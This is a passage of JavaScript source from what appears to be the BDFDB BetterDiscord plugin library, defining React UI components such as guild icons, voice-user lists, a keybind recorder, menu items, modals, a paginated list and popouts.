							children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.NavItem, {
								to: {
									pathname: BDFDB.DiscordConstants.Routes.CHANNEL(this.props.guild.id, this.props.selectedChannelId),
									state: {
										analyticsSource: {
											page: BDFDB.DiscordConstants.AnalyticsPages.GUILD_CHANNEL,
											section: BDFDB.DiscordConstants.AnalyticsSections.CHANNEL_LIST,
											object: BDFDB.DiscordConstants.AnalyticsObjects.CHANNEL
										}
									}
								},
								name: this.props.guild.name,
								onMouseEnter: this.handleMouseEnter.bind(this),
								onMouseLeave: this.handleMouseLeave.bind(this),
								onMouseDown: this.handleMouseDown.bind(this),
								onMouseUp: this.handleMouseUp.bind(this),
								onClick: this.handleClick.bind(this),
								onContextMenu: this.handleContextMenu.bind(this),
								icon: this.props.guild.getIconURL(this.props.iconSize || 96, this.state.hovered && this.props.animatable),
								selected: this.props.selected || this.state.hovered
							})
						})
					});
					
					let children = [
						this.props.list || this.props.pill ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildComponents.Pill, {
							hovered: !isDraggedGuild && this.state.hovered,
							selected: !isDraggedGuild && this.props.selected,
							unread: !isDraggedGuild && this.props.unread,
							className: BDFDB.disCN.guildpill
						}) : null,
						!this.props.tooltip ? guild : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
							tooltipConfig: Object.assign({type: "right"}, this.props.tooltipConfig, {guild: this.props.list && this.props.guild}),
							children: guild
						})
					].filter(n => n);
					return this.props.list ? BDFDB.ReactUtils.createElement("div", {
						ref: null != this.props.setRef ? this.props.setRef : null,
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.guildouter, BDFDB.disCN._bdguild, this.props.unread && BDFDB.disCN._bdguildunread, this.props.selected && BDFDB.disCN._bdguildselected, this.props.unread && BDFDB.disCN._bdguildunread, this.props.audio && BDFDB.disCN._bdguildaudio, this.props.video && BDFDB.disCN._bdguildvideo),
						children: BDFDB.ReactUtils.createElement(Internal.LibraryModules.React.Fragment, {
							children: children
						})
					}) : BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.guild, this.props.className),
						children: children
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.GuildComponents.Guild, {menu: true, tooltip: true, list: false, state: false, draggable: false, sorting: false});
			
			CustomComponents.GuildSummaryItem = reactInitialized && class BDFDB_GuildSummaryItem extends Internal.LibraryModules.React.Component {
				defaultRenderGuild(guild, isLast) {
					if (!guild) return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.guildsummaryemptyguild
					});
					let icon = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildComponents.Icon, {
						className: BDFDB.disCN.guildsummaryicon,
						guild: guild,
						showTooltip: this.props.showTooltip,
						tooltipPosition: "top",
						size: Internal.LibraryComponents.GuildComponents.Icon.Sizes.SMALLER
					});
					return this.props.switchOnClick ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
						className: BDFDB.disCN.guildsummaryclickableicon,
						onClick: _ => Internal.LibraryModules.HistoryUtils.transitionTo(BDFDB.DiscordConstants.Routes.CHANNEL(guild.id, Internal.LibraryModules.LastChannelStore.getChannelId(guild.id))),
						key: guild.id,
						tabIndex: -1,
						children: icon
					}) : icon;
				}
				renderGuilds() {
					let elements = [];
					let renderGuild = typeof this.props.renderGuild != "function" ? this.defaultRenderGuild : this.props.renderGuild;
					let loaded = 0, max = this.props.guilds.length === this.props.max ? this.props.guilds.length : this.props.max - 1;
					while (loaded < max && loaded < this.props.guilds.length) {
						let isLast = loaded === this.props.guilds.length - 1;
						let guild = renderGuild.apply(this, [this.props.guilds[loaded], isLast]);
						elements.push(BDFDB.ReactUtils.createElement("div", {
							className: isLast ? BDFDB.disCN.guildsummaryiconcontainer : BDFDB.disCN.guildsummaryiconcontainermasked,
							children: guild
						}));
						loaded++;
					}
					if (loaded < this.props.guilds.length) {
						let rest = Math.min(this.props.guilds.length - loaded, 99);
						elements.push(BDFDB.ReactUtils.createElement(Internal.LibraryModules.React.Fragment, {
							key: "more-guilds",
							children: this.props.renderMoreGuilds("+" + rest, rest, this.props.guilds.slice(loaded), this.props)
						}));
					}
					return elements;
				}
				renderIcon() {
					return this.props.renderIcon ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
						name: Internal.LibraryComponents.SvgIcon.Names.WHATISTHIS,
						className: BDFDB.disCN.guildsummarysvgicon
					}) : null;
				}
				render() {
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.guildsummarycontainer),
						ref: this.props._ref,
						children: [
							this.renderIcon.apply(this),
							this.renderGuilds.apply(this)
						].flat(10).filter(n => n)
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.GuildSummaryItem, {max: 10, renderMoreGuilds: (count, amount, restGuilds, props) => {
				let icon = BDFDB.ReactUtils.createElement("div", {className: BDFDB.disCN.guildsummarymoreguilds, children: count});
				return props.showTooltip ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
					text: restGuilds.map(guild => guild.name).join(", "),
					children: icon
				}) : icon;
			}, renderIcon: false});
			
			CustomComponents.GuildVoiceList = reactInitialized && class BDFDB_GuildVoiceList extends Internal.LibraryModules.React.Component {
				render() {
					let channels = Internal.LibraryModules.GuildChannelStore.getChannels(this.props.guild.id);
					let voiceChannels = (channels[Internal.LibraryModules.GuildChannelKeys.GUILD_VOCAL_CHANNELS_KEY] || []).filter(c => c.channel.type == BDFDB.DiscordConstants.ChannelTypes.GUILD_VOICE).map(c => c.channel.id);
					let stageChannels = (channels[Internal.LibraryModules.GuildChannelKeys.GUILD_VOCAL_CHANNELS_KEY] || []).filter(c => c.channel.type == BDFDB.DiscordConstants.ChannelTypes.GUILD_STAGE_VOICE && Internal.LibraryModules.StageChannelStore.getStageInstanceByChannel(c.channel.id)).map(c => c.channel.id);
					let streamOwnerIds = Internal.LibraryModules.StreamUtils.getAllApplicationStreams().filter(app => app.guildId === this.props.guild.id).map(app => app.ownerId) || [];
					let streamOwners = streamOwnerIds.map(ownerId => Internal.LibraryModules.UserStore.getUser(ownerId)).filter(n => n);
					let connectedVoiceUsers = BDFDB.ObjectUtils.toArray(Internal.LibraryModules.VoiceUtils.getVoiceStates(this.props.guild.id)).map(state => voiceChannels.includes(state.channelId) && state.channelId != this.props.guild.afkChannelId && !streamOwnerIds.includes(state.userId) && Internal.LibraryModules.UserStore.getUser(state.userId)).filter(n => n);
					let connectedStageUsers = BDFDB.ObjectUtils.toArray(Internal.LibraryModules.VoiceUtils.getVoiceStates(this.props.guild.id)).map(state => stageChannels.includes(state.channelId) && state.channelId != this.props.guild.afkChannelId && !streamOwnerIds.includes(state.userId) && Internal.LibraryModules.UserStore.getUser(state.userId)).filter(n => n);
					let children = [
						!connectedStageUsers.length ? null : BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.tooltiprow,
							children: [
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
									name: Internal.LibraryComponents.SvgIcon.Names.PODIUM,
									className: BDFDB.disCN.tooltipactivityicon
								}),
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.UserSummaryItem, {
									users: connectedStageUsers,
									max: 6
								})
							]
						}),
						!connectedVoiceUsers.length ? null : BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.tooltiprow,
							children: [
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
									name: Internal.LibraryComponents.SvgIcon.Names.SPEAKER,
									className: BDFDB.disCN.tooltipactivityicon
								}),
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.UserSummaryItem, {
									users: connectedVoiceUsers,
									max: 6
								})
							]
						}),
						!streamOwners.length ? null : BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.tooltiprow,
							children: [
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
									name: Internal.LibraryComponents.SvgIcon.Names.STREAM,
									className: BDFDB.disCN.tooltipactivityicon
								}),
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.UserSummaryItem, {
									users: streamOwners,
									max: 6
								})
							]
						})
					].filter(n => n);
					return !children.length ? null : BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.guildvoicelist,
						children: children
					});
				}
			};
			
			CustomComponents.KeybindRecorder = reactInitialized && class BDFDB_KeybindRecorder extends Internal.LibraryModules.React.Component {
				handleChange(arrays) {
					this.props.value = arrays.map(platformKey => Internal.LibraryModules.KeyEvents.codes[Internal.LibraryModules.KeyCodeUtils.codeToKey(platformKey)] || platformKey[1]);
					if (typeof this.props.onChange == "function") this.props.onChange(this.props.value, this);
				}
				handleReset() {
					this.props.value = [];
					if (this.recorder) this.recorder.setState({codes: []});
					if (typeof this.props.onChange == "function") this.props.onChange([], this);
					if (typeof this.props.onReset == "function") this.props.onReset(this);
				}
				componentDidMount() {
					if (!this.recorder) this.recorder = BDFDB.ReactUtils.findOwner(this, {name: "KeybindRecorder"});
				}
				render() {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
						className: BDFDB.disCN.hotkeywrapper,
						direction: Internal.LibraryComponents.Flex.Direction.HORIZONTAL,
						align: Internal.LibraryComponents.Flex.Align.CENTER,
						children: [
							BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.KeybindRecorder, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
								defaultValue: [this.props.defaultValue || this.props.value].flat(10).filter(n => n).map(keyCode => [BDFDB.DiscordConstants.KeyboardDeviceTypes.KEYBOARD_KEY, Internal.LibraryModules.KeyCodeUtils.keyToCode((Object.entries(Internal.LibraryModules.KeyEvents.codes).find(n => n[1] == keyCode && Internal.LibraryModules.KeyCodeUtils.keyToCode(n[0], null)) || [])[0], null) || keyCode]),
								onChange: this.handleChange.bind(this)
							}), "reset", "onReset")),
							this.props.reset || this.props.onReset ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
								text: BDFDB.LanguageUtils.LanguageStrings.REMOVE_KEYBIND,
								tooltipConfig: {type: "top"},
								children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
									className: BDFDB.disCN.hotkeyresetbutton,
									onClick: this.handleReset.bind(this),
									children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
										iconSVG: `<svg height="20" width="20" viewBox="0 0 20 20"><path fill="currentColor" d="M 14.348 14.849 c -0.469 0.469 -1.229 0.469 -1.697 0 l -2.651 -3.030 -2.651 3.029 c -0.469 0.469 -1.229 0.469 -1.697 0 -0.469 -0.469 -0.469 -1.229 0 -1.697l2.758 -3.15 -2.759 -3.152 c -0.469 -0.469 -0.469 -1.228 0 -1.697 s 1.228 -0.469 1.697 0 l 2.652 3.031 2.651 -3.031 c 0.469 -0.469 1.228 -0.469 1.697 0 s 0.469 1.229 0 1.697l -2.758 3.152 2.758 3.15 c 0.469 0.469 0.469 1.229 0 1.698 z"></path></svg>`,
									})
								})
							}) : null
						].filter(n => n)
					});
				}
			};
			
			CustomComponents.ListRow = reactInitialized && class BDFDB_ListRow extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement("div", BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.listrowwrapper, this.props.className, BDFDB.disCN.listrow),
						children: [
							this.props.prefix,
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.listrowcontent,
								style: {flex: "1 1 auto"},
								children: [
									BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.listname, this.props.labelClassName),
										style: {flex: "1 1 auto"},
										children: this.props.label
									}),
									typeof this.props.note == "string" ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormText, {
										type: Internal.LibraryComponents.FormComponents.FormText.Types.DESCRIPTION,
										children: this.props.note
									}) : null
								].filter(n => n)
							}),
							this.props.suffix
						].filter(n => n)
					}), "label", "note", "suffix", "prefix", "labelClassName"));
				}
			};
			
			CustomComponents.MemberRole = reactInitialized && class BDFDB_MemberRole extends Internal.LibraryModules.React.Component {
				handleClick(e) {if (typeof this.props.onClick == "function") this.props.onClick(e, this);}
				handleContextMenu(e) {if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);}
				render() {
					let color = BDFDB.ColorUtils.convert(this.props.role.colorString, "RGB") || BDFDB.DiscordConstants.Colors.PRIMARY_DARK_300;
					return BDFDB.ReactUtils.createElement("li", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.userpopoutrole, this.props.className),
						style: {borderColor: BDFDB.ColorUtils.setAlpha(color, 0.6)},
						onClick: this.handleClick.bind(this),
						onContextMenu: this.handleContextMenu.bind(this),
						children: [
							!this.props.noCircle ? BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.userpopoutrolecircle,
								style: {backgroundColor: color}
							}) : null,
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.userpopoutrolename,
								children: this.props.role.name
							})
						].filter(n => n)
					});
				}
			};
			
			CustomComponents.MenuItems = {};
			CustomComponents.MenuItems.MenuCheckboxItem = reactInitialized && class BDFDB_MenuCheckboxItem extends Internal.LibraryModules.React.Component {
				handleClick() {
					if (this.props.state) {
						this.props.state.checked = !this.props.state.checked;
						if (typeof this.props.action == "function") this.props.action(this.props.state.checked, this);
					}
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.MenuCheckboxItem, Object.assign({}, this.props, {
						checked: this.props.state && this.props.state.checked,
						action: this.handleClick.bind(this)
					}));
				}
			};
			
			CustomComponents.MenuItems.MenuHint = reactInitialized && class BDFDB_MenuHint extends Internal.LibraryModules.React.Component {
				render() {
					return !this.props.hint ? null : BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.menuhint,
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextScroller, {
							children: this.props.hint
						})
					});
				}
			};
			
			CustomComponents.MenuItems.MenuIcon = reactInitialized && class BDFDB_MenuIcon extends Internal.LibraryModules.React.Component {
				render() {
					let isString = typeof this.props.icon == "string";
					return !this.props.icon ? null : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
						className: BDFDB.disCN.menuicon,
						nativeClass: true,
						iconSVG: isString ? this.props.icon : null,
						name: !isString ? this.props.icon : null
					});
				}
			};
			
			CustomComponents.MenuItems.MenuSliderItem = reactInitialized && class BDFDB_MenuSliderItem extends Internal.LibraryModules.React.Component {
				handleValueChange(value) {
					if (this.props.state) {
						this.props.state.value = Math.round(BDFDB.NumberUtils.mapRange([0, 100], [this.props.minValue, this.props.maxValue], value) * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits);
						if (typeof this.props.onValueChange == "function") this.props.onValueChange(this.props.state.value, this);
					}
					BDFDB.ReactUtils.forceUpdate(this);
				}
				handleValueRender(value) {
					let newValue = Math.round(BDFDB.NumberUtils.mapRange([0, 100], [this.props.minValue, this.props.maxValue], value) * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits);
					if (typeof this.props.onValueRender == "function") {
						let tempReturn = this.props.onValueRender(newValue, this);
						if (tempReturn != undefined) newValue = tempReturn;
					}
					return newValue;
				}
				render() {
					let value = this.props.state && this.props.state.value || 0;
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.MenuControlItem, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						label: typeof this.props.renderLabel == "function" ? this.props.renderLabel(Math.round(value * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits), this) : this.props.label,
						control: (menuItemProps, ref) => {
							return BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.menuslidercontainer,
								children: BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.Slider, Object.assign({}, menuItemProps, {
									ref: ref,
									className: BDFDB.disCN.menuslider,
									mini: true,
									initialValue: Math.round(BDFDB.NumberUtils.mapRange([this.props.minValue, this.props.maxValue], [0, 100], value) * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits),
									onValueChange: this.handleValueChange.bind(this),
									onValueRender: this.handleValueRender.bind(this)
								}))
							});
						}
					}), "digits", "renderLabel"));
				}
			};
			Internal.setDefaultProps(CustomComponents.MenuItems.MenuSliderItem, {minValue: 0, maxValue: 100, digits: 0});
			
			CustomComponents.ModalComponents = {};
			CustomComponents.ModalComponents.ModalContent = reactInitialized && class BDFDB_ModalContent extends Internal.LibraryModules.React.Component {
				render() {
					return this.props.scroller ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Scrollers.Thin, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.modalcontent, this.props.className),
						ref: this.props.scrollerRef,
						children: this.props.children
					}) : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
						className: BDFDB.DOMUtils.formatClassName(this.props.content && BDFDB.disCN.modalcontent, BDFDB.disCN.modalnoscroller, this.props.className),
						direction: this.props.direction || Internal.LibraryComponents.Flex.Direction.VERTICAL,
						align: Internal.LibraryComponents.Flex.Align.STRETCH,
						children: this.props.children
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.ModalComponents.ModalContent, {scroller: true, content: true});
			
			CustomComponents.ModalComponents.ModalTabContent = reactInitialized && class BDFDB_ModalTabContent extends Internal.LibraryModules.React.Component {
				render() {
					return !this.props.open ? null : BDFDB.ReactUtils.createElement(this.props.scroller ? Internal.LibraryComponents.Scrollers.Thin : "div", Object.assign(BDFDB.ObjectUtils.exclude(this.props, "scroller", "open"), {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.modaltabcontent, this.props.open && BDFDB.disCN.modaltabcontentopen, this.props.className),
						children: this.props.children
					}));
				}
			};
			Internal.setDefaultProps(CustomComponents.ModalComponents.ModalTabContent, {tab: "unnamed"});
			
			CustomComponents.ModalComponents.ModalFooter = reactInitialized && class BDFDB_ModalFooter extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.modalfooter, this.props.className),
						direction: this.props.direction || Internal.LibraryComponents.Flex.Direction.HORIZONTAL_REVERSE,
						align: Internal.LibraryComponents.Flex.Align.STRETCH,
						grow: 0,
						shrink: 0,
						children: this.props.children
					});
				}
			};
			
			CustomComponents.MultiInput = reactInitialized && class BDFDB_MultiInput extends Internal.LibraryModules.React.Component {
				constructor(props) {
					super(props);
					this.state = {focused: false};
				}
				render() {
					if (this.props.children && this.props.children.props) this.props.children.props.className = BDFDB.DOMUtils.formatClassName(this.props.children.props.className, BDFDB.disCN.inputmultifield);
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.inputwrapper, BDFDB.disCN.inputmultiwrapper),
						children: BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.input, BDFDB.disCN.inputmulti, this.state.focused && BDFDB.disCN.inputfocused),
							children: [
								BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.DOMUtils.formatClassName(this.props.innerClassName, BDFDB.disCN.inputwrapper, BDFDB.disCN.inputmultifirst),
									children: this.props.children
								}),
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextInput, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
									className: BDFDB.disCN.inputmultilast,
									inputClassName: BDFDB.disCN.inputmultifield,
									onFocus: e => this.setState({focused: true}),
									onBlur: e => this.setState({focused: false})
								}), "children", "innerClassName"))
							]
						})
					});
				}
			};
			
			CustomComponents.ListInput = reactInitialized && class BDFDB_ListInput extends Internal.LibraryModules.React.Component {
				handleChange() {
					if (typeof this.props.onChange) this.props.onChange(this.props.items, this);
				}
				render() {
					if (!BDFDB.ArrayUtils.is(this.props.items)) this.props.items = [];
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.MultiInput, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						className: BDFDB.disCN.inputlist,
						innerClassName: BDFDB.disCN.inputlistitems,
						onKeyDown: e => {
							if (e.which == 13 && e.target.value && e.target.value.trim()) {
								let value = e.target.value.trim();
								this.props.value = "";
								if (!this.props.items.includes(value)) {
									this.props.items.push(value);
									BDFDB.ReactUtils.forceUpdate(this);
									this.handleChange.apply(this, []);
								}
							}
						},
						children: this.props.items.map(item => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Badges.TextBadge, {
							className: BDFDB.disCN.inputlistitem,
							color: "var(--bdfdb-blurple)",
							style: {borderRadius: "3px"},
							text: [
								item,
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
									className: BDFDB.disCN.inputlistdelete,
									name: Internal.LibraryComponents.SvgIcon.Names.CLOSE,
									onClick: _ => {
										BDFDB.ArrayUtils.remove(this.props.items, item);
										BDFDB.ReactUtils.forceUpdate(this);
										this.handleChange.apply(this, []);
									}
								})
							]
						}))
					}), "items"));
				}
			};
			
			CustomComponents.PaginatedList = reactInitialized && class BDFDB_PaginatedList extends Internal.LibraryModules.React.Component {
				constructor(props) {
					super(props);
					this.state = {
						offset: props.offset
					};
				}
				handleJump(offset) {
					if (offset > -1 && offset < Math.ceil(this.props.items.length/this.props.amount) && this.state.offset != offset) {
						this.state.offset = offset;
						if (typeof this.props.onJump == "function") this.props.onJump(offset, this);
						BDFDB.ReactUtils.forceUpdate(this);
					}
				}
				renderPagination(bottom) {
					let maxOffset = Math.ceil(this.props.items.length/this.props.amount) - 1;
					return this.props.items.length > this.props.amount && BDFDB.ReactUtils.createElement("nav", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.pagination, bottom ? BDFDB.disCN.paginationbottom : BDFDB.disCN.paginationtop, this.props.mini && BDFDB.disCN.paginationmini),
						children: [
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Paginator, {
								totalCount: this.props.items.length,
								currentPage: this.state.offset + 1,
								pageSize: this.props.amount,
								maxVisiblePages: this.props.maxVisiblePages,
								onPageChange: page => {this.handleJump(isNaN(parseInt(page)) ? -1 : page - 1);}
							}),
							this.props.jump && BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextInput, {
								type: "number",
								size: Internal.LibraryComponents.TextInput.Sizes.MINI,
								value: this.state.offset + 1,
								min: 1,
								max: maxOffset + 1,
								onKeyDown: (event, instance) => {if (event.which == 13) this.handleJump(isNaN(parseInt(instance.props.value)) ? -1 : instance.props.value - 1);}
							}),
						].filter(n => n)
					});
				}
				render() {
					let items = [], alphabet = {};
					if (BDFDB.ArrayUtils.is(this.props.items) && this.props.items.length) {
						if (!this.props.alphabetKey) items = this.props.items;
						else {
							let unsortedItems = [].concat(this.props.items);
							for (let key of ["0-9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]) {
								let numbers = key == "0-9", alphaItems = [];
								for (let item of unsortedItems) if (item && item[this.props.alphabetKey] && (numbers && !isNaN(parseInt(item[this.props.alphabetKey][0])) || item[this.props.alphabetKey].toUpperCase().indexOf(key) == 0)) alphaItems.push(item);
								for (let sortedItem of alphaItems) BDFDB.ArrayUtils.remove(unsortedItems, sortedItem);
								alphabet[key] = {items: BDFDB.ArrayUtils.keySort(alphaItems, this.props.alphabetKey), disabled: !alphaItems.length};
							}
							alphabet["?!"] = {items: BDFDB.ArrayUtils.keySort(unsortedItems, this.props.alphabetKey), disabled: !unsortedItems.length};
							for (let key in alphabet) items.push(alphabet[key].items);
							items = items.flat(10);
						}
					}
					return typeof this.props.renderItem != "function" || !items.length ? null : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Scrollers.Thin, {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.paginationlist, this.props.mini && BDFDB.disCN.paginationlistmini),
						fade: this.props.fade,
						children: [
							this.renderPagination(),
							items.length > this.props.amount && this.props.alphabetKey && BDFDB.ReactUtils.createElement("nav", {
								className: BDFDB.disCN.paginationlistalphabet,
								children: Object.keys(alphabet).map(key => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
									className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.paginationlistalphabetchar, alphabet[key].disabled &&BDFDB.disCN.paginationlistalphabetchardisabled),
									onClick: _ => {if (!alphabet[key].disabled) this.handleJump(Math.floor(items.indexOf(alphabet[key].items[0])/this.props.amount));},
									children: key
								}))
							}),
							this.props.header,
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.paginationlistcontent,
								children: items.slice(this.state.offset * this.props.amount, (this.state.offset + 1) * this.props.amount).map((data, i) => {return this.props.renderItem(data, i);}).flat(10).filter(n => n)
							}),
							this.props.copyToBottom && this.renderPagination(true)
						].flat(10).filter(n => n)
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.PaginatedList, {amount: 50, offset: 0, mini: true, jump: true, maxVisiblePages: 7, copyToBottom: false, fade: true});
			
			CustomComponents.Popout = reactInitialized && class BDFDB_Popout extends Internal.LibraryModules.React.Component {
				componentDidMount() {
					this.props.containerInstance.popout = this;
					if (typeof this.props.onOpen == "function") this.props.onOpen(this.props.containerInstance, this);
				}
				componentWillUnmount() {
					delete this.props.containerInstance.popout;
					if (typeof this.props.onClose == "function") this.props.onClose(this.props.containerInstance, this);
				}
				render() {
					if (!this.props.wrap) return this.props.children;
					let pos = typeof this.props.position == "string" ? this.props.position.toLowerCase() : null;
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutFocusLock, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.popoutwrapper, this.props.className, this.props.themed && BDFDB.disCN.popoutthemedpopout, this.props.arrow  && BDFDB.disCN.popoutarrow, this.props.arrow && (pos == "top" ? BDFDB.disCN.popoutarrowtop : BDFDB.disCN.popoutarrowbottom)),
						id: this.props.id,
						onClick: e => e.stopPropagation(),
						style: BDFDB.ObjectUtils.extract(this.props, "padding", "height", "maxHeight", "minHeight", "width", "maxWidth", "minWidth"),
						children: this.props.children
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.Popout, {themed: true, wrap: true});
			
			CustomComponents.PopoutContainer = reactInitialized && class BDFDB_PopoutContainer extends Internal.LibraryModules.React.Component {
				componentDidMount() {
					this.toggle = this.toggle.bind(this);
					this.onDocumentClicked = this.onDocumentClicked.bind(this);
					this.domElementRef = BDFDB.ReactUtils.createRef();
					this.domElementRef.current = BDFDB.ReactUtils.findDOMNode(this);
				}
				onDocumentClicked() {
					const node = BDFDB.ReactUtils.findDOMNode(this.popout);
					if (!node || !document.contains(node) || node != event.target && document.contains(event.target) && !node.contains(event.target)) this.toggle();
				}
				toggle() {
					this.props.open = !this.props.open;
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					const child = (BDFDB.ArrayUtils.is(this.props.children) ? this.props.children[0] : this.props.children) || BDFDB.ReactUtils.createElement("div", {style: {height: "100%", width: "100%"}});
					child.props.className = BDFDB.DOMUtils.formatClassName(child.props.className, this.props.className);
					const childProps = Object.assign({}, child.props);
					child.props.onClick = (e, childThis) => {
						if ((this.props.openOnClick || this.props.openOnClick === undefined)) this.toggle();
						if (typeof this.props.onClick == "function") this.props.onClick(e, this);
						if (typeof childProps.onClick == "function") childProps.onClick(e, childThis);
						if (this.props.killEvent || childProps.killEvent) BDFDB.ListenerUtils.stopEvent(e);
					};
					child.props.onContextMenu = (e, childThis) => {
						if (this.props.openOnContextMenu) this.toggle();
						if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);
						if (typeof childProps.onContextMenu == "function") childProps.onContextMenu(e, childThis);
						if (this.props.killEvent || childProps.killEvent) BDFDB.ListenerUtils.stopEvent(e);
					};
					return BDFDB.ReactUtils.createElement(Internal.LibraryModules.React.Fragment, {
						onClick: this.toggle,
						children: [
							child,
							this.props.open && BDFDB.ReactUtils.createElement(Internal.LibraryComponents.AppReferencePositionLayer, {
								onMount: _ => BDFDB.TimeUtils.timeout(_ => document.addEventListener("click", this.onDocumentClicked)),
								onUnmount: _ => document.removeEventListener("click", this.onDocumentClicked),
								position: this.props.position,
								align: this.props.align,
								reference: this.domElementRef,
								children: _ => {
									const popout = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Popout, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
										className: this.props.popoutClassName,
										containerInstance: this,
										position: this.props.position,
										style: this.props.popoutStyle,
										onOpen: typeof this.props.onOpen == "function" ? this.props.onOpen.bind(this) : _ => {},
										onClose: typeof this.props.onClose == "function" ? this.props.onClose.bind(this) : _ => {},
										children: typeof this.props.renderPopout == "function" ? this.props.renderPopout(this) : null
									}), "popoutStyle", "popoutClassName", "shouldShow", "changing", "renderPopout", "openOnClick", "onClick", "openOnContextMenu", "onContextMenu"));
									const animation = Object.entries(Internal.LibraryComponents.PopoutContainer.Animation).find(n => n[1] == this.props.animation);
									return !animation || this.props.animation == Internal.LibraryComponents.PopoutContainer.Animation.NONE ? popout : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutCSSAnimator, {
										position: this.props.position,
										type: Internal.LibraryComponents.PopoutCSSAnimator.Types[animation[0]],
										children: popout
									});
								}
							})
						]
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.PopoutContainer, {wrap: true});
			
			CustomComponents.QuickSelect = reactInitialized && class BDFDB_QuickSelect extends Internal.LibraryModules.React.Component {
				handleChange(option) {
